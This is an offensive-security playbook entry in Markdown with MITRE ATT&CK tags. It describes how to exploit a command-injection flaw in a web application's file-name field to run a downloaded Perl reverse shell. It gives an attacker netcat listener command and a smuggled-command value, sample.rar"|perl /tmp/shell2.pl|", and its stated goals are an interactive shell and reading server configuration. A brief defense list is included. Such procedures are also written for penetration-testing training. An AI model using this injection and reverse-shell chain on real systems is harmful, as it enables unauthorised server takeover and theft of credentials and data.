---
id: proc-inject-execute
tags:
  - command-injection
  - reverse-shell
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/perl-execute-shell]]'
  - '[[commands/nc-listen]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[PowerShell]]'
updated_at: '2025-12-14T17:24:08.686Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[PowerShell]]'
---
# Inject-Command-to-Execute-Reverse-Shell

## Summary

This procedure injects a command to execute the downloaded Perl reverse shell, establishing a connection back to the attacker for full RCE and shell access.

## Description

Repeat the extraction to run 'perl /tmp/shell2.pl', which connects to the attacker's listener. Exploits the same injection point. Expected outcome: Interactive shell on attacker machine.

## Requirements

1. Downloaded shell.pl on server
2. Netcat listener on port 443
3. Burp Suite for second injection

## Defense

Defensive measures and detection strategies:

- Block outbound connections to untrusted IPs
- Monitor exec calls and Perl executions in logs
- Use AppArmor/SELinux to restrict shell spawns

## Objectives

1. Trigger payload execution
2. Gain remote shell access
3. Compromise server (e.g., read config.php)

## Instructions

### Step 1: Setup Listener

**Context**: Prepare to receive the reverse connection.

Execute [[commands/nc-listen]]:

```bash
nc -lvp 443
```

> Run on attacker machine. Expected output: Listening on port 443.

### Step 2: Inject Execution Command

**Context**: Modify second request to run the Perl script.

Execute [[commands/perl-execute-shell]] via injection:

```bash
perl /tmp/shell2.pl
```

> Set nameOfFile to: sample.rar"|perl /tmp/shell2.pl|". Forward. Expected output: Shell connects to listener.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell
- [[PowerShell]] PowerShell (adapted to Perl scripting)

### Sub-Techniques


## Commands Used

- [[commands/perl-execute-shell]]
- [[commands/nc-listen]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Netcat]]

## Tags

- command-injection
- reverse-shell
